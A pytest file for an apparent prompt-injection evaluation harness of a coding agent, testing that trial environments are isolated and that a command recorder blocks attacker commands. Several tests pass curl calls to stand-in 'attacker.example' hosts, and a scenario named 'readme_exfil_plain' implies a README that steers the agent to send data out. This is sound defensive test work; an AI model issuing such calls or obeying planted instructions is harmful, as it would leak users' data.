"""The injection eval's trial environment and command recorder."""
from __future__ import annotations

import pytest

from evals.injection.isolation import CommandRecorder, eval_environment
from evals.injection.models import Allow, Arm, Trial
from evals.injection.scenarios import load_scenarios


def _trial(defense: bool, approval: str = "ask") -> Trial:
    scenario = next(s for s in load_scenarios() if s.id == "readme_exfil_plain")
    arm = Arm(defense=defense, approval=approval)
    return Trial(scenario, arm, 0, "inj-readme_exfil_plain-000000")


def test_environment_isolates_home_and_carries_auth(tmp_path):
    real = {"HOME": "/Users/real", "PATH": "/bin"}
    env = eval_environment(real, tmp_path / "home", _trial(defense=False), tmp_path / "state")
    assert env["HOME"] == str(tmp_path / "home")
    assert env["CRUCIBLE_CHATGPT_AUTH_DIR"] == "/Users/real/.crucible/auth/chatgpt"
    assert env["HF_HOME"] == "/Users/real/.cache/huggingface"
    assert env["CRUCIBLE_INJECTION_DEFENSE"] == "0"
    assert env["CRUCIBLE_SUBAGENTS_ENABLED"] == "0"
    assert env["CRUCIBLE_MEMORY_DB_PATH"].startswith(str(tmp_path / "state"))
    assert env["PATH"] == "/bin"


def test_environment_keeps_provider_settings_and_drops_the_rest(tmp_path):
    real = {"HOME": "/Users/real", "CRUCIBLE_CHATGPT_MODEL": "m", "CRUCIBLE_CLAUDE_MODEL": "c",
            "CRUCIBLE_CHATGPT_REGISTRATION": "r", "CRUCIBLE_DB_PATH": "/Users/real/db",
            "CRUCIBLE_SHELL_POLICY": "allow_all"}
    env = eval_environment(real, tmp_path / "home", _trial(defense=True), tmp_path / "state")
    assert env["CRUCIBLE_CHATGPT_MODEL"] == "m" and env["CRUCIBLE_CLAUDE_MODEL"] == "c"
    assert env["CRUCIBLE_CHATGPT_REGISTRATION"] == "r"
    assert env["CRUCIBLE_DB_PATH"].startswith(str(tmp_path / "state"))
    assert "CRUCIBLE_SHELL_POLICY" not in env


@pytest.mark.asyncio
async def test_attacker_command_never_runs_even_if_allowed(tmp_path):
    rec = CommandRecorder(Allow(commands=("curl *",)))
    with rec.install():
        from agentd.tools import shell
        out = await shell.run_command(command="curl", args=["https://inj-a-000000.attacker.example"],
                                      shadow_root=tmp_path, real_workspace_path=tmp_path)
    assert out.output == "(not run in eval)"
    assert rec.records[0].ran is False and "attacker.example" in rec.records[0].line


@pytest.mark.asyncio
async def test_allowed_command_really_runs(tmp_path):
    rec = CommandRecorder(Allow(commands=("echo *",)))
    with rec.install():
        from agentd.tools import shell
        out = await shell.run_command(command="echo", args=["hi"], shadow_root=tmp_path,
                                      real_workspace_path=tmp_path)
    assert "hi" in out.output and rec.records[0].ran and rec.records[0].exit_code == 0


def test_recorder_restores_run_command():
    from agentd.tools import shell
    original = shell.run_command
    with CommandRecorder(Allow()).install():
        assert shell.run_command is not original
    assert shell.run_command is original


@pytest.mark.asyncio
async def test_recorder_notes_whether_the_command_was_sandboxed(tmp_path):
    rec = CommandRecorder(Allow())
    with rec.install():
        from agentd.tools import shell
        await shell.run_command(command="curl", args=["https://x.attacker.example"],
                                shadow_root=tmp_path, real_workspace_path=tmp_path,
                                sandbox=object())
        await shell.run_command(command="curl", args=["https://y.attacker.example"],
                                shadow_root=tmp_path, real_workspace_path=tmp_path)
    assert [r.sandboxed for r in rec.records] == [True, False]
